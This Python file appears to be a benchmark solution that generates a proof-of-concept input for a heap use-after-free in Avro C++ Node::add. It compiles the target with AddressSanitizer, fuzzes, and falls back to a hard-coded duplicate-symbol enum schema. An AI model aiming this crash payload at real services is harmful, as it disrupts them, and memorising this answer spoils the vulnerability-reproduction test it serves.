import os
import sys
import tarfile
import subprocess
import tempfile
import random
import time
import re
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        The vulnerability (arvo:41356) corresponds to a Heap Use After Free in Avro C++
        Node::add when an exception (like invalid schema definition) is thrown.
        Specifically, adding duplicate symbols to an enum triggers this in vulnerable versions.
        """
        
        # This payload is constructed to trigger the specific double-free in Node::add
        # by defining an Enum with duplicate symbols ("a" repeated).
        # Length: 46 bytes.
        fallback_payload = b'{"type":"enum","name":"e","symbols":["a","a"]}'
        
        work_dir = tempfile.mkdtemp()
        try:
            # 1. Extract source code
            try:
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=work_dir)
            except Exception:
                # If extraction fails, rely on the known vulnerability payload
                return fallback_payload

            # 2. Identify source files and fuzz target
            sources = []
            fuzz_target_path = None
            include_dirs = set()
            
            for root, dirs, files in os.walk(work_dir):
                include_dirs.add(root)
                for file in files:
                    if file.endswith(('.cpp', '.cc', '.cxx', '.c')):
                        path = os.path.join(root, file)
                        try:
                            # Check if this file contains the libFuzzer entry point
                            with open(path, 'rb') as f:
                                content = f.read()
                                if b"LLVMFuzzerTestOneInput" in content:
                                    fuzz_target_path = path
                                else:
                                    # Heuristic: include non-test files to build the library components
                                    if "test" not in file.lower() or "fuzz" in file.lower():
                                        sources.append(path)
                        except:
                            pass
            
            if not fuzz_target_path:
                return fallback_payload
                
            if fuzz_target_path in sources:
                sources.remove(fuzz_target_path)

            # 3. Create a driver for the fuzzer to run standalone
            driver_path = os.path.join(work_dir, "driver.cpp")
            with open(driver_path, "w") as f:
                f.write("""
#include <stdint.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <vector>

extern "C" int LLVMFuzzerTestOneInput(const uint8_t *Data, size_t Size);

int main(int argc, char **argv) {
    if (argc < 2) return 0;
    FILE *fp = fopen(argv[1], "rb");
    if (!fp) return 1;
    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    fseek(fp, 0, SEEK_SET);
    std::vector<uint8_t> buf(size);
    if (size > 0) fread(buf.data(), 1, size, fp);
    fclose(fp);
    LLVMFuzzerTestOneInput(buf.data(), buf.size());
    return 0;
}
""")

            # 4. Compile the binary with AddressSanitizer
            bin_path = os.path.join(work_dir, "vuln_bin")
            cxx = "clang++" # Assumes clang++ is available in the environment
            
            inc_flags = [f"-I{d}" for d in include_dirs]
            flags = ["-fsanitize=address", "-O1", "-g", "-w"]
            libs = ["-lpthread"]
            
            # Compile command
            cmd = [cxx] + flags + inc_flags + [driver_path, fuzz_target_path] + sources + ["-o", bin_path] + libs
            
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            if not os.path.exists(bin_path):
                return fallback_payload

            # 5. Fuzzing Phase
            # Seeds including the hypothesis payload
            seeds = [
                b'{}', 
                fallback_payload,
                b'{"type":"record","name":"n","fields":[]}',
                b'{"type":"enum","name":"e","symbols":[]}'
            ]
            
            # Helper to check if input crashes the binary
            def check_crash(data):
                tf = None
                try:
                    with tempfile.NamedTemporaryFile(delete=False) as f:
                        f.write(data)
                        tf = f.name
                    
                    env = os.environ.copy()
                    # halt_on_error=1 ensures immediate exit on ASan error
                    env['ASAN_OPTIONS'] = 'halt_on_error=1:detect_leaks=0'
                    
                    proc = subprocess.run([bin_path, tf], env=env, capture_output=True, timeout=2)
                    
                    if proc.returncode != 0:
                        if b"AddressSanitizer" in proc.stderr:
                            return True
                    return False
                except:
                    return False
                finally:
                    if tf and os.path.exists(tf):
                        os.remove(tf)

            # Minimizer function
            def minimize(data):
                current = bytearray(data)
                improved = True
                while improved:
                    improved = False
                    i = 0
                    while i < len(current):
                        # Try removing byte at i
                        candidate = current[:i] + current[i+1:]
                        if check_crash(candidate):
                            current = candidate
                            improved = True
                        else:
                            i += 1
                return bytes(current)

            # Check seeds first
            for seed in seeds:
                if check_crash(seed):
                    return minimize(seed)
            
            # Basic Mutation Fuzzing
            vocab = [b'"type"', b'"name"', b'"fields"', b'"symbols"', b'"record"', b'"enum"', b'"array"', b'"int"', b'"string"']
            corpus = list(seeds)
            start_time = time.time()
            
            while time.time() - start_time < 20: # Time budget
                parent = random.choice(corpus)
                
                # Mutate
                res = bytearray(parent)
                op = random.randint(0, 4)
                if not res: 
                    child = b'{'
                else:
                    pos = random.randint(0, len(res))
                    if op == 0: # Flip
                        p = random.randint(0, len(res)-1)
                        res[p] ^= random.randint(1, 255)
                    elif op == 1: # Insert token
                        token = random.choice(vocab)
                        res[pos:pos] = token
                    elif op == 2: # Delete
                        if len(res) > 0:
                            p = random.randint(0, len(res)-1)
                            del res[p]
                    elif op == 3: # Duplicate
                        if len(res) > 0:
                            p1 = random.randint(0, len(res)-1)
                            p2 = random.randint(p1, len(res))
                            res[pos:pos] = res[p1:p2]
                    child = bytes(res)

                if check_crash(child):
                    return minimize(child)
                
                # Keep corpus fresh
                if random.random() < 0.05 and len(child) < 200:
                    corpus.append(child)

            return fallback_payload

        except Exception:
            return fallback_payload
        finally:
            shutil.rmtree(work_dir, ignore_errors=True)